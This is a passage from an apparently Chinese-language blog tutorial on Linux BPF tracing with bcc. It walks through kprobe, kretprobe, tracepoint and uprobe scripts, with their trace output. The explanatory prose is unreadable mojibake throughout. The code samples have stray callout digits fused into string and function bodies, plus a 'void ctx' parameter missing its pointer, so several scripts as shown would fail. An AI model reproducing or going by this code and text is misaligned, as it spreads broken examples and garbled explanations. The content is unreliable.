class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""1</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("executing program: %s\\n", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.attach_kprobe(event=execve_function, fn_name=<span class="string">"do_sys_execve"</span>)</span><br><span class="line">bpf.trace_print()<span class="number">4</span></span><br></pre></td></tr></table></figure><p>1ï¼šBPFç¨‹åºå¼€å§‹æ‰§è¡Œï¼Œè¾…åŠ©å‡½æ•°<code>bpf_get_current_comm</code>å°†è·å–å†…æ ¸æ­£åœ¨è¿è¡Œçš„å½“å‰å‘½ä»¤çš„åç§°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨æˆ‘ä»¬çš„<code>comm</code>å˜é‡ä¸­ã€‚æˆ‘ä»¬å°†å…¶å®šä¹‰ä¸ºå›ºå®šé•¿åº¦æ•°ç»„ï¼Œå› ä¸ºå†…æ ¸å¯¹å‘½ä»¤åç§°æœ‰16ä¸ªå­—ç¬¦çš„é™åˆ¶ã€‚è·å¾—å‘½ä»¤åç§°åï¼Œæˆ‘ä»¬å°†å…¶æ‰“å°åœ¨è°ƒè¯•è·Ÿè¸ªä¸­ï¼Œè¿™æ ·è¿è¡ŒPythonè„šæœ¬çš„äººå°±å¯ä»¥çœ‹åˆ°BPFæ•è·çš„æ‰€æœ‰å‘½ä»¤ã€‚</p><p>2ï¼šåŠ è½½BPFç¨‹åºåˆ°å†…æ ¸ä¸­</p><p>3ï¼šå°†ç¨‹åºä¸<code>execve</code>ç³»ç»Ÿè°ƒç”¨ç›¸å…³è”ã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„åç§°åœ¨ä¸åŒçš„å†…æ ¸ç‰ˆæœ¬ä¸­å‘ç”Ÿäº†å˜åŒ–ï¼Œå¹¶ä¸”BCCæä¾›äº†ä¸€ä¸ªå‡½æ•°æ¥æ£€ç´¢è¿™ä¸ªåç§°ï¼Œè€Œæ— éœ€è®°ä½ä½ æ­£åœ¨è¿è¡Œçš„å†…æ ¸ç‰ˆæœ¬ã€‚</p><p>4ï¼šè¯¥ä»£ç è¾“å‡ºè·Ÿè¸ªæ—¥å¿—ï¼Œå› æ­¤ä½ å¯ä»¥çœ‹åˆ°ä½¿ç”¨è¯¥ç¨‹åºè·Ÿè¸ªçš„æ‰€æœ‰å‘½ä»¤ã€‚</p><p>æ‰§è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kprobes.py </span><br><span class="line">b'     barad_agent-1950607 [000] d..31 829823.592341: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950610 [000] d..31 829823.594794: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950609 [000] d..31 829823.595494: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950608 [000] d..31 829823.597752: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950614 [000] d..31 829826.591153: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950614 [000] d..31 829826.592741: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950615 [000] d..31 829826.594348: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950617 [000] d..31 829826.595978: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950616 [000] d..31 829826.597514: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950620 [000] d..31 829827.593496: bpf_trace_printk: executing program: barad_agent''</span><br></pre></td></tr></table></figure><h4 id="Kretprobes"><a href="#Kretprobes" class="headerlink" title="Kretprobes"></a>Kretprobes</h4><p>å½“å†…æ ¸æŒ‡ä»¤åœ¨æ‰§è¡Œåè¿”å›ä¸€ä¸ªå€¼æ—¶ï¼Œ<code>Kretprobes</code>å°†æ’å…¥ä½ çš„BPFç¨‹åºã€‚é€šå¸¸ï¼Œä½ ä¼šå¸Œæœ›å°†<code>kprobes</code>å’Œ<code>kretrobes</code>ç»„åˆåˆ°ä¸€ä¸ªBPFç¨‹åºä¸­ï¼Œä»¥ä¾¿å…¨é¢äº†è§£æŒ‡ä»¤çš„è¡Œä¸ºã€‚</p><p>æˆ‘ä»¬å°†ä½¿ç”¨ä¸ä¸Šä¸€èŠ‚ä¸­çš„ç¤ºä¾‹ç±»ä¼¼çš„ç¤ºä¾‹æ¥å±•ç¤º<code>kretprobes</code>çš„å·¥ä½œåŸç†ï¼š</p><p><code>kretprobes.py</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int ret_sys_execve(struct pt_regs *ctx) &#123;1</span></span><br><span class="line"><span class="string">  int return_value;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return_value = PT_REGS_RC(ctx);</span></span><br><span class="line"><span class="string">  bpf_trace_printk("program: %s, return: %d\\n", comm, return_value);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=execve_function, fn_name=<span class="string">"ret_sys_execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1ï¼šå®šä¹‰å®ç°BPFç¨‹åºçš„å‡½æ•°ã€‚ å†…æ ¸å°†åœ¨<code>execve</code>ç³»ç»Ÿè°ƒç”¨å®Œæˆåç«‹å³æ‰§è¡Œå®ƒã€‚ <code>PT_REGS_RC</code>æ˜¯ä¸€ä¸ªå®ï¼Œå®ƒå°†ä»BPFå¯„å­˜å™¨ä¸­è¯»å–æ­¤ç‰¹å®šä¸Šä¸‹æ–‡çš„è¿”å›å€¼ã€‚æˆ‘ä»¬è¿˜ä½¿ç”¨<code>bpf_trace_printk</code>åœ¨è°ƒè¯•æ—¥å¿—ä¸­æ‰“å°å‘½ä»¤åŠå…¶è¿”å›å€¼</p><p>2ï¼šåˆå§‹åŒ–BPFç¨‹åºå¹¶å°†å…¶åŠ è½½åˆ°å†…æ ¸ä¸­</p><p>3ï¼šå°†é™„ç€å‡½æ•°æ›´æ”¹ä¸º<code>attach_kretprobe</code></p><p>æ‰§è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kretprobes.py </span><br><span class="line">b'              sh-1953793 [000] dN.31 831223.599284: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953796 [000] dN.31 831223.601352: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'            grep-1953795 [000] dN.31 831223.602648: bpf_trace_printk: program: grep, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953794 [000] dN.31 831223.604214: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953798 [000] d..31 831226.598533: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953798 [000] d..31 831226.599918: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953799 [000] dN.31 831226.601655: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953801 [000] dN.31 831226.603102: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953800 [000] dN.31 831226.604683: bpf_trace_printk: program: cat, return: 0'</span><br></pre></td></tr></table></figure><p>å†…æ ¸æ¢é’ˆæ˜¯è®¿é—®å†…æ ¸çš„ä¸€ç§å¼ºå¤§æ–¹æ³•ã€‚ä½†æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œå®ƒä»¬å¯èƒ½ä¸å¤ªç¨³å®šï¼Œå› ä¸ºä½ é™„ç€åˆ°å†…æ ¸æºä»£ç ä¸­çš„åŠ¨æ€ç‚¹ï¼Œè¿™äº›åŠ¨æ€ç‚¹å¯èƒ½ä¼šä»ä¸€ä¸ªç‰ˆæœ¬æ›´æ”¹æˆ–æ¶ˆå¤±åˆ°å¦ä¸€ä¸ªç‰ˆæœ¬ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§æ›´å®‰å…¨çš„å°†ç¨‹åºé™„ç€åˆ°å†…æ ¸çš„æ–¹æ³•ã€‚</p><h3 id="Tracepoints"><a href="#Tracepoints" class="headerlink" title="Tracepoints"></a>Tracepoints</h3><p>è·Ÿè¸ªç‚¹æ˜¯å†…æ ¸ä»£ç ä¸­çš„é™æ€æ ‡è®°ï¼Œå¯ç”¨äºå°†ä»£ç é™„ç€åˆ°æ­£åœ¨è¿è¡Œçš„å†…æ ¸ä¸­ã€‚ä¸<code>kprobe</code>çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå®ƒä»¬æ˜¯ç”±å†…æ ¸å¼€å‘äººå‘˜åœ¨å®ç°å†…æ ¸æ›´æ”¹æ—¶ç¼–å†™çš„ï¼›è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å°†å®ƒä»¬ç§°ä¸ºé™æ€çš„ã€‚å› ä¸ºå®ƒä»¬æ˜¯é™æ€çš„ï¼Œæ‰€ä»¥è·Ÿè¸ªç‚¹çš„ABIæ›´ç¨³å®šï¼›å†…æ ¸å§‹ç»ˆä¿è¯æ—§ç‰ˆæœ¬ä¸­çš„è·Ÿè¸ªç‚¹å°†å­˜åœ¨äºæ–°ç‰ˆæœ¬ä¸­ã€‚ä½†æ˜¯ï¼Œé‰´äºå¼€å‘äººå‘˜éœ€è¦å°†å®ƒä»¬æ·»åŠ åˆ°å†…æ ¸ä¸­ï¼Œå®ƒä»¬å¯èƒ½ä¸ä¼šæ¶µç›–æ„æˆå†…æ ¸çš„æ‰€æœ‰å­ç³»ç»Ÿã€‚</p><p>æ­£å¦‚æˆ‘ä»¬åœ¨ä¹‹å‰æåˆ°çš„ï¼Œä½ å¯ä»¥é€šè¿‡åˆ—å‡º<code>/sys/kernel/debug/tracing/events</code>ä¸­çš„æ‰€æœ‰æ–‡ä»¶æ¥æŸ¥çœ‹ç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„è·Ÿè¸ªç‚¹ã€‚</p><p>è¯¥è¾“å‡ºä¸­åˆ—å‡ºçš„æ¯ä¸ªå­ç›®å½•éƒ½å¯¹åº”ä¸€ä¸ªè·Ÿè¸ªç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†BPFç¨‹åºé™„ç€åˆ°è¯¥è·Ÿè¸ªç‚¹ã€‚ä½†æ˜¯é‚£é‡Œè¿˜æœ‰ä¸¤ä¸ªé™„åŠ æ–‡ä»¶ã€‚<code>enable</code>æ–‡ä»¶å…è®¸ä½ å¯ç”¨å’Œç¦ç”¨BPFå­ç³»ç»Ÿçš„æ‰€æœ‰è·Ÿè¸ªç‚¹ã€‚ å¦‚æœæ–‡ä»¶å†…å®¹ä¸º0ï¼Œåˆ™ç¦ç”¨è·Ÿè¸ªç‚¹ï¼›å¦‚æœæ–‡ä»¶çš„å†…å®¹ä¸º1ï¼Œåˆ™å¯ç”¨è·Ÿè¸ªç‚¹ã€‚<code>filter</code>æ–‡ä»¶å…è®¸ä½ ç¼–å†™å†…æ ¸ä¸­çš„Traceå­ç³»ç»Ÿå°†ç”¨äºè¿‡æ»¤äº‹ä»¶çš„è¡¨è¾¾å¼ã€‚</p><p>ç¼–å†™BPFç¨‹åºåˆ©ç”¨è·Ÿè¸ªç‚¹ç±»ä¼¼äºä½¿ç”¨<code>kprobes</code>è¿›è¡Œè·Ÿè¸ªã€‚ è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨BPFç¨‹åºæ¥è·Ÿè¸ªç³»ç»Ÿä¸­åŠ è½½å…¶ä»–BPFç¨‹åºçš„æ‰€æœ‰åº”ç”¨ç¨‹åºçš„ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load(void ctx) &#123;1</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("%s is loading a BPF program", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_tracepoint(tp = <span class="string">"bpf:bpf_prog_load"</span>, fn_name = <span class="string">"trace_bpf_prog_load"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1ï¼šå£°æ˜å®šä¹‰BPFç¨‹åºçš„å‡½æ•°</p><p>2ï¼šè¯¥ç¨‹åºçš„ä¸»è¦åŒºåˆ«åœ¨äºï¼šæˆ‘ä»¬ä¸æ˜¯å°†ç¨‹åºé™„ç€åˆ°<code>kprobe</code>ï¼Œè€Œæ˜¯å°†å…¶é™„ç€åˆ°è·Ÿè¸ªç‚¹ã€‚ BCCéµå¾ªå‘½åè·Ÿè¸ªç‚¹çš„çº¦å®šï¼› é¦–å…ˆï¼Œéœ€è¦æŒ‡å®šè¦è·Ÿè¸ªçš„å­ç³»ç»Ÿï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸ºbpfï¼‰ï¼Œåè·Ÿä¸€ä¸ªå†’å·ï¼Œç„¶åæ˜¯å­ç³»ç»Ÿä¸­çš„è·Ÿè¸ªç‚¹ <code>pbf_prog_load</code>ã€‚ è¿™æ„å‘³ç€æ¯æ¬¡å†…æ ¸æ‰§è¡Œå‡½æ•°<code>bpf_prog_load</code>æ—¶ï¼Œè¿™ä¸ªç¨‹åºéƒ½ä¼šæ¥æ”¶åˆ°äº‹ä»¶ï¼Œå¹¶æ‰“å°å‡ºæ­£åœ¨æ‰§è¡Œ <code>bpf_prog_load</code>æŒ‡ä»¤çš„åº”ç”¨ç¨‹åºçš„åç§°ã€‚</p><p>å†…æ ¸æ¢é’ˆå’Œè·Ÿè¸ªç‚¹ä½¿ä½ èƒ½å¤Ÿå®Œå…¨è®¿é—®å†…æ ¸ã€‚æˆ‘ä»¬å»ºè®®ä½ å°½å¯èƒ½ä½¿ç”¨è·Ÿè¸ªç‚¹ï¼Œä½†ä¸è¦ä»…ä»…å› ä¸ºè·Ÿè¸ªç‚¹æ›´å®‰å…¨è€ŒåšæŒä½¿ç”¨è·Ÿè¸ªç‚¹ã€‚åˆ©ç”¨å†…æ ¸æ¢é’ˆçš„åŠ¨æ€ç‰¹æ€§ã€‚åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå¦‚ä½•åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œçš„ç¨‹åºä¸­è·å¾—ç±»ä¼¼çº§åˆ«çš„å¯è§æ€§ã€‚</p><h3 id="User-Space-Probes"><a href="#User-Space-Probes" class="headerlink" title="User-Space Probes"></a>User-Space Probes</h3><p>ç”¨æˆ·ç©ºé—´æ¢é’ˆå…è®¸ä½ åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œçš„ç¨‹åºä¸­è®¾ç½®åŠ¨æ€æ ‡å¿—ã€‚å®ƒä»¬ç›¸å½“äºå†…æ ¸æ¢é’ˆï¼Œç”¨äºæ£€æµ‹åœ¨å†…æ ¸å¤–è¿è¡Œçš„ç¨‹åºã€‚å½“ä½ å®šä¹‰ä¸€ä¸ª<code>uprobe</code>æ—¶ï¼Œå†…æ ¸ä¼šåœ¨é™„åŠ çš„æŒ‡ä»¤å‘¨å›´åˆ›å»ºä¸€ä¸ªé™·é˜±ã€‚ å½“ä½ çš„åº”ç”¨ç¨‹åºåˆ°è¾¾è¯¥æŒ‡ä»¤æ—¶ï¼Œå†…æ ¸ä¼šè§¦å‘ä¸€ä¸ªäº‹ä»¶ï¼Œè¯¥äº‹ä»¶å°†ä½ çš„æ¢æµ‹å‡½æ•°ä½œä¸ºå›è°ƒå‡½æ•°ã€‚<code>Uprobes</code>è¿˜å…è®¸ä½ è®¿é—®ç¨‹åºé“¾æ¥åˆ°çš„ä»»ä½•åº“ï¼Œå¦‚æœä½ çŸ¥é“æŒ‡ä»¤çš„æ­£ç¡®åç§°ï¼Œå°±å¯ä»¥è·Ÿè¸ªè¿™äº›è°ƒç”¨ã€‚</p><p>åƒå†…æ ¸æ¢é’ˆä¸€æ ·ï¼Œç”¨æˆ·ç©ºé—´æ¢é’ˆä¹Ÿåˆ†ä¸ºä¸¤ç±»ï¼Œ<code>uprobes</code>å’Œ<code>uretprobes</code>ï¼Œè¿™å–å†³äºä½ åœ¨ç¨‹åºæ‰§è¡Œå‘¨æœŸä¸­æ’å…¥BPFç¨‹åºçš„ä½ç½®ã€‚ è®©æˆ‘ä»¬ç›´æ¥çœ‹ä¸€äº›ä¾‹å­ã€‚</p><h4 id="uprobes"><a href="#uprobes" class="headerlink" title="uprobes"></a>uprobes</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œ<code>uprobes</code>æ˜¯å†…æ ¸åœ¨æ‰§è¡Œç‰¹å®šæŒ‡ä»¤ä¹‹å‰æ’å…¥åˆ°ç¨‹åºæŒ‡ä»¤é›†ä¸­çš„é’©å­ã€‚å°†<code>uprobes</code>é™„åŠ åˆ°åŒä¸€ç¨‹åºçš„ä¸åŒç‰ˆæœ¬æ—¶éœ€è¦å°å¿ƒï¼Œå› ä¸ºå‡½æ•°ç­¾åå¯èƒ½ä¼šåœ¨è¿™äº›ç‰ˆæœ¬ä¹‹é—´å†…éƒ¨å‘ç”Ÿå˜åŒ–ã€‚ä¿è¯BPFç¨‹åºåœ¨ä¸¤ä¸ªä¸åŒç‰ˆæœ¬ä¸­è¿è¡Œçš„å”¯ä¸€æ–¹æ³•æ˜¯ç¡®ä¿ç­¾åæ²¡æœ‰æ›´æ”¹ã€‚ä½ å¯ä»¥åœ¨Linuxä¸­ä½¿ç”¨å‘½ä»¤<code>nm</code>åˆ—å‡ºELFç›®æ ‡æ–‡ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰ç¬¦å·ï¼Œè¿™æ˜¯æ£€æŸ¥ä½ æ­£åœ¨è·Ÿè¸ªçš„æŒ‡ä»¤æ˜¯å¦ä»ç„¶å­˜åœ¨ç¨‹åºä¸­çš„å¥½åŠæ³•ï¼Œä¾‹å¦‚ï¼š</p><p><code>main.go</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Hello, BPF"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨<code>go build -o hello-bpf main.go</code>ç¼–è¯‘è¿™ä¸ªGoç¨‹åºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# go build -o hello-bpf main.go</span><br></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨å‘½ä»¤<code>nm</code>è·å–æœ‰å…³äºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«çš„æ‰€æœ‰æŒ‡ä»¤ç‚¹çš„ä¿¡æ¯ã€‚<code>nm</code>æ˜¯GNUå¼€å‘å·¥å…·ä¸­åŒ…å«çš„ä¸€ä¸ªç¨‹åºï¼Œå®ƒåˆ—å‡ºäº†ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·ã€‚ å¦‚æœä½ è¿‡æ»¤åç§°ä¸­å¸¦æœ‰<code>main</code>çš„ç¬¦å·ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªç±»ä¼¼å¦‚ä¸‹çš„åˆ—è¡¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# nm hello-bpf | grep main</span><br><span class="line">0000000000535ec0 D main..inittask</span><br><span class="line">0000000000497640 T main.main</span><br><span class="line">0000000000434d20 T runtime.main</span><br><span class="line">000000000045e440 T runtime.main.func1</span><br><span class="line">000000000045e4a0 T runtime.main.func2</span><br><span class="line">000000000054ab50 B runtime.main_init_done</span><br><span class="line">00000000004d8828 R runtime.mainPC</span><br><span class="line">0000000000578210 B runtime.mainStarted</span><br></pre></td></tr></table></figure><p>ç°åœ¨ä½ æœ‰äº†ä¸€ä¸ªç¬¦å·åˆ—è¡¨ï¼Œå¯ä»¥è·Ÿè¸ªå®ƒä»¬ä½•æ—¶æ‰§è¡Œï¼Œç”šè‡³åœ¨æ‰§è¡Œç›¸åŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸åŒè¿›ç¨‹ä¹‹é—´ã€‚</p><p>ä¸ºäº†è·Ÿè¸ªæˆ‘ä»¬ä¹‹å‰çš„ Go ç¤ºä¾‹ä¸­çš„ main å‡½æ•°ä½•æ—¶æ‰§è¡Œï¼Œæˆ‘ä»¬å°†ç¼–å†™ä¸€ä¸ª BPF ç¨‹åºï¼Œå¹¶å°†å…¶é™„åŠ åˆ°ä¸€ä¸ª uprobeï¼Œè¯¥ uprobe å°†åœ¨ä»»ä½•è¿›ç¨‹è°ƒç”¨è¯¥æŒ‡ä»¤ä¹‹å‰ä¸­æ–­ï¼š</p><p><code>uprobes.py</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_go_main(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello-bpf process running with PID: %d\\n", pid);1</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_go_main"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1ï¼šä½¿ç”¨å‡½æ•°<code>bpf_get_current_pid_tgid</code>æ¥è·å–è¿è¡Œæˆ‘ä»¬çš„<code>hello-bpf</code>ç¨‹åºçš„è¿›ç¨‹çš„è¿›ç¨‹æ ‡è¯†ç¬¦ (PID)ã€‚</p><p>2ï¼šå°†æ­¤ç¨‹åºé™„ç€åˆ°<code>uprobe</code>ã€‚ è¿™ä¸ªè°ƒç”¨éœ€è¦çŸ¥é“æˆ‘ä»¬è¦è·Ÿè¸ªçš„å¯¹è±¡<code>hello-bpf</code>æ˜¯å¯¹è±¡æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚å®ƒè¿˜éœ€è¦æˆ‘ä»¬åœ¨å¯¹è±¡å†…éƒ¨è·Ÿè¸ªçš„ç¬¦å·ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º<code>main.main</code>ï¼Œä»¥åŠæˆ‘ä»¬è¦è¿è¡Œçš„BPFç¨‹åºã€‚ è¿™æ ·ï¼Œæ¯å½“æœ‰äººåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­è¿è¡Œ<code>hello-bpf</code>æ—¶ï¼Œæˆ‘ä»¬éƒ½ä¼šåœ¨è·Ÿè¸ªç®¡é“ä¸­è·å¾—ä¸€ä¸ªæ–°æ—¥å¿—ã€‚</p><p>é¦–å…ˆæ‰§è¡Œ<code>hello-bpf</code>ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>æ¥ç€æŸ¥çœ‹<code>uprobes.py</code>ç¨‹åºçš„è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1977813 [000] d..31 841378.451282: bpf_trace_printk: New hello-bpf process running with PID: 1977813'</span><br><span class="line">b''</span><br><span 